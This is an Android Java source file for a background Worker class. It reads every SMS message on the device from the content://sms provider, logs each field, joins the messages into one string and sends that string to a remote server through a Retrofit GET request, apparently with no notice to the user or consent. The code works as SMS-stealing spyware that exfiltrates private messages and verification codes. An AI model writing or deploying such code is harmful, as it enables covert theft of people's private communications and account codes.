package com.example.mobile2;

import android.content.Context;
import android.util.Log;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import android.content.Context;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import okhttp3.ResponseBody;


public class MyWorker extends Worker {
    static final String LOG_TAG = "MyLogs";
    private String result = "";

    public MyWorker(Context context, WorkerParameters params) {
        super(context, params);
    }

    @Override
    public Result doWork() {
        formInformation(getApplicationContext());
        Log.d(LOG_TAG, "doWork: end");
        return Result.success();
    }

    private void formInformation(Context context) {
        // form string that contents all sms-s
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        if(cursor.moveToFirst()){
            do {
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    Log.d(LOG_TAG, cursor.getColumnName(i) + "=" + cursor.getString(i) + "");
                    result += cursor.getColumnName(i) + "=" + cursor.getString(i) + ";";
                }
                result += "\n";
            } while (cursor.moveToNext());
        }
        cursor.close();

        // form call for get-request
        MyRetrofit mRetrofit = new MyRetrofit();
        Call<ResponseBody> call = mRetrofit.formData().getData(result);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                Log.d(LOG_TAG, "Response");
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {

            }
        });
    }
}
